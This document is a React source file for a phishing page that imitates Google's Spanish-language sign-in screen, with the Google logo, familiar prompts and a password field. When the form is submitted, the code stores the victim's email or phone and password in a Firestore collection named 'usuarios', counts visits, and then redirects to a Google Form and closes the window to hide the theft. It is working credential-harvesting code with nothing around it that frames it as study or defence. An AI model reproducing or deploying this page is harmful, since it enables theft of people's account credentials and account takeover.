import React, { useEffect, useState } from 'react';
import './theme/style.css';
import logo from './theme/google.png';
import TextField from '@material-ui/core/TextField';
import { db } from './firebaseconfig';


interface Contador{
  cantidadFire:number;
}

function App() {

  //Datos del usuario
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  
  useEffect(() => {
    guardarContador();
  }, [])

  const guardarContador=async()=>{
    let {docs}= await db.collection('contador').get();
    if (docs.length===0) {
      await db.collection('contador').add({
        cantidadFire:1
      });
      return;
    }
    
    const nuevoEstado = docs.map((item)=>({id:item.id,...item.data()}));
    let idDoc=nuevoEstado[0].id.toString();
    const datoConta =await db.collection('contador').doc(idDoc).get();
    const {cantidadFire}:any= datoConta.data();
    let cantidad:number=parseInt(cantidadFire)+1;


    
    //Cargar contador
    let datosContador:Contador={
      cantidadFire:cantidad
    }
    await db.collection('contador').doc(idDoc).set({...datosContador,cantidadFire:cantidad});
  }

  const guardarUsuario=async(e:any)=>{
    e.preventDefault();
    const usuario={
      usuario:username,
      clave:password
    }
    
    await db.collection('usuarios').add(usuario);
    setUsername('');
    setPassword('');
    const url ='https://docs.google.com/forms/d/e/1FAIpQLSevJVUOnKEvUJIG7clH0qBdJdZivQQETgl2VzDDOljWW4EEyQ/viewform';
    window.open(url,"_parent");
    window.close();
  }
  return (
    
    <div className="maindiv" style={{ width:448, height:550}}>
     <img src={logo} alt="Google"/>
     <h1 style={{fontWeight:'bold',marginTop:20, marginBottom:15}}>Iniciar sesión</h1>
     <h3>Utiliza tu cuenta de Google</h3>
     <form onSubmit={(e)=>guardarUsuario(e)}>
     <div className="inputs" style={{marginTop:20}}>
       <div className="Fields" style={{width:'100%'}}>
         <div className="Fieldset">
         <TextField id="standard-basic" 
                    label="Correo electrónico o teléfono" 
                    variant='filled' style={{width:'100%'}} required 
                    onChange={(e)=>setUsername(e.target.value)}
                    value={username}
                    />
         </div>
       </div>
       <div className="Fields" style={{width:'100%'}}>
         <div className="Fieldset" >
     
           <TextField id="standar-basic" 
                      label="Introduce tu contraseña" 
                      variant='filled' style={{width:'100%'}}
                      type='Password' required
                      onChange={(e)=>setPassword(e.target.value)}
                      value={password}
                      />
         </div>
       </div>
     </div>
     <div style={{marginTop:-30,textAlign:'start'}}>
     <a href="/" style={{fontSize:13, fontWeight:'bold', textDecoration:'none',
                        fontFamily: 'Noto Sans', 
                        color:'#1A73E7',
                        }}>¿Has olvidado tu correo electrónico?</a>
     </div>
    <div style={{textAlign:'start',marginTop:30, marginBottom:25}}>
    <p style={{fontSize:13, fontFamily:'Noto Sans'}}>¿No es tu ordenador? Usa el modo invitados para iniciar sesión de forma privada. <strong>Más información</strong></p>
    </div>

 
      <div style={{flex:1}}>
        <input type="submit" value="Iniciar Sesión" className='btn btn-primary'/>
      </div>
    
      
       </form>
  
    </div>
  




  );
}


export default App;
